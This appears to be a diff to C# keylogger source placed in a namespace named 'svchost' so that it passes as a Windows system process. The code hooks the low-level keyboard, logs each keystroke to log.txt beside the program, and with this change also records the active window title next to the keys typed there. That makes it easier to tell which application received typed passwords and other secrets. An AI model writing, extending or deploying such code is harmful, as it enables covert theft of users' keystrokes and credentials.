@@ -26,6 +26,19 @@ namespace svchost
             UnhookWindowsHookEx(_hookID);
         }
 
+        private string GetActiveWindowTitle()
+        {
+            const int nChars = 256;
+            StringBuilder Buff = new StringBuilder(nChars);
+            IntPtr handle = GetForegroundWindow();
+
+            if (GetWindowText(handle, Buff, nChars) > 0)
+            {
+                return Buff.ToString();
+            }
+            return null;
+        }
+
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
             using (Process curProcess = Process.GetCurrentProcess())
@@ -47,7 +60,9 @@ namespace svchost
                 int vkCode = Marshal.ReadInt32(lParam);
                 Console.WriteLine((Keys)vkCode);
                 StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
-      
+
+                sw.Write(GetActiveWindowTitle());
+
                 switch ((Keys)vkCode)
                 {
                     case Keys.NumPad0:
@@ -305,19 +320,6 @@ namespace svchost
                 sw.Close();
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
-        }
-
-        private string GetActiveWindowTitle()
-        {
-            const int nChars = 256;
-            StringBuilder Buff = new StringBuilder(nChars);
-            IntPtr handle = GetForegroundWindow();
-
-            if (GetWindowText(handle, Buff, nChars) > 0)
-            {
-                return Buff.ToString();
-            }
-            return null;
         }
 
         //These Dll's will handle the hooks. Yaaar mateys!
